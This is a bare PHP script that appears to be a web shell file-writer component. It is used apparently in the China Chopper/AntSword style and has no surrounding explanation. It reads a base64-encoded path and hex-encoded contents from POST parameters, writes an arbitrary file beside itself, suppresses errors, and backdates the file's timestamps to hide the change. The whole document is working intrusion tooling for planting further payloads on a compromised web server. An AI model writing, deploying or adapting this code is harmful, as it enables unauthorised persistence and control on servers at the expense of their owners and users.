<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$f=dirname(__FILE__).'/'.base64_decode($_POST["z1"]);
$c=$_POST["z2"];
$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);
$buf="";
for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
@touch($f, filectime(dirname(__FILE__)), fileatime(dirname(__FILE__)));
echo("|<-");
die();
?>